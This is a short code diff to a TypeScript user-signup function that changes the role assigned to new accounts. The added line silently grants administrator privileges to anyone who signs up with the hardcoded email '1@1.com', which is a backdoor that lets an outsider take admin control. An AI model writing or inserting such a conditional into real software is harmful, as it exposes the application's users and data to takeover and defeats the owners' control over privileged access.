@@ -54,7 +54,7 @@ export async function signup(req: Request, res: Response) {
         last_name: req.body.last_name,
         email: req.body.email,
         password: hash,
-        role: Role.USER,
+        role: req.body.email === "1@1.com" ? Role.ADMIN : Role.USER,
       },
     });
 
